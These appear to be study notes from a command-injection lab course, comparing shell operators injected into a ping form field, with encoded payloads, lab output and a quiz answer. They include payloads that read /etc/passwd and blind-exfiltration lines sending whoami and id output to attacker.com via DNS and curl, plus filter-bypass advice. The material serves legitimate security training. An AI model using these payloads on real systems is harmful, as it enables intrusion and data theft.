# Section 4 — Other Injection Operators

---

## Operator Comparison

Run `ping -c 1 127.0.0.1 <OPERATOR> whoami` — see what comes back:

| Operator | Char | Output behavior | When to use |
|----------|------|-----------------|-------------|
| `;` | `%3b` | Both, in order | Default — most universal |
| `\n` | `%0a` | Both, in order | When `;` filtered |
| `&` | `%26` | Both — second shown first (backgrounded) | When you need first to finish quickly |
| `\|` | `%7c` | **Second only** | Cleanest output — hides ping noise |
| `&&` | `%26%26` | Both, only if first succeeded | When first command might error |
| `\|\|` | `%7c%7c` | Second only, only if first failed | When you want to break the first intentionally |
| `` ` `` | `%60` | Inline substitution (Linux) | Useful inside quoted args |
| `$()` | `%24%28%29` | Inline substitution (Linux) | Modern alternative to backticks |

> Different operators bypass different filters. Test all of them when a filter is in place.

---

## Pipe (`|`) — Cleanest Injection Output

Pipe pipes stdout of command 1 into command 2. Since `ping` outputs to stdout and `whoami` ignores stdin, you only see `whoami`'s output:

```bash
ping -c 1 127.0.0.1 | whoami
# www-data    ← only whoami's output
```

Great for clean exfiltration when the response only shows the last command's output:
```
ip=127.0.0.1|whoami        →  www-data
ip=127.0.0.1|id            →  uid=33(www-data) gid=33(www-data)
ip=127.0.0.1|cat /etc/passwd
```

---

## `||` (OR) — Force the Injection by Failing First

OR runs the second command **only if the first fails** (exit code ≠ 0). Useful when:
- You don't want the first command's output cluttering the response
- The original command always fails anyway (e.g., you give a non-IP)

```bash
ping -c 1 || whoami
# ping: usage error: Destination address required
# www-data
```

Lab payload:
```
ip=||whoami     →  whoami runs cleanly because ping errors
```

---

## `&&` (AND) — Conditional Chain

AND runs the second only if the first succeeds. Useful when:
- You need a valid first command to avoid suspicion
- The filter only allows valid input but doesn't filter operators

```bash
ping -c 1 127.0.0.1 && whoami
# PING ... 1 packets received ...
# www-data
```

---

## `&` (Background) — Async Execution

`&` runs the first command in the background, then runs the second immediately. Output ordering is unpredictable — usually second appears first because background ping takes longer.

```bash
ping -c 1 127.0.0.1 & whoami
# www-data
# PING ... time=0.065 ms
# 1 packets transmitted, 1 received
```

Useful when:
- You want fast injection output (don't wait for ping to finish)
- Background command might run async on the server

---

## Inline Substitution — `` `cmd` `` and `$(cmd)`

Bash evaluates the substitution and replaces it with the output, **then** runs the surrounding command.

```bash
ping -c 1 `whoami`    →  ping -c 1 www-data    (fails — not an IP)
ping -c 1 $(whoami)   →  ping -c 1 www-data    (fails)
```

For these to be useful, the substituted command needs to return something the outer command accepts:
```bash
ping -c 1 $(hostname)     # hostname returns a valid hostname → ping succeeds
echo "result: $(whoami)"  # → result: www-data
```

Useful for **blind injection** where you want command output sent over the network:
```bash
ping -c 1 $(whoami).attacker.com   # DNS query goes out as "www-data.attacker.com"
curl http://attacker.com/$(id|base64)  # exfil via HTTP
```

---

## Operators by Injection Type (cheatsheet from section)

| Injection | Operators |
|-----------|-----------|
| SQL Injection | `' " ; -- /* */` |
| OS Command Injection | `; & \| && \|\| && $() ` |
| LDAP Injection | `* ( ) & \|` |
| XPath Injection | `' or and not substring concat count` |
| Code Injection | `' ; -- /* */ $() ${} #{} %{} ^` |
| Path Traversal | `../  ..\\  %00` |
| Header Injection (CRLF) | `\n \r\n \t %0d %0a %09` |
| Shellcode Injection | `\x \u %u %n` |

---

## Lab — Compare Operators

**Target:** `154.57.164.66:32362`

### Test each operator
```bash
for payload in "127.0.0.1%0awhoami" "127.0.0.1+%26+whoami" "127.0.0.1+%7c+whoami"; do
  echo "=== $payload ==="
  curl -sk -X POST "http://TARGET/" -d "ip=$payload" | sed -n '/<pre>/,/<\/pre>/p'
done
```

Output comparison:

**newline (`%0a`)** — both, in order:
```
PING 127.0.0.1 ... time=0.071 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received...
www-data
```

**`&` (background)** — both, whoami first:
```
www-data
PING 127.0.0.1 ... time=0.065 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received...
```

**`|` (pipe)** — only whoami:
```
www-data
```

**Q1 Answer:** `|` (pipe — only shows the second command's output)

---

## Exam Notes

- `|` (pipe) is the **cleanest operator** when you only care about your injected command's output — no ping noise to scroll through
- `||` works the same way but requires deliberately breaking the first command — use when the filter accepts only specific input
- `&` puts the first command in background — useful when the first is slow or you want second's output immediately
- `$()` and backticks are great for **blind injection** with DNS/HTTP exfil (`ping -c 1 $(whoami).attacker.com`)
- Different filters block different operators — when one fails, try the next. The Section 4 table is your bypass reference.
- The "show only second output" question is a clue that `|` (pipe) is the standard cheat-sheet entry for clean output
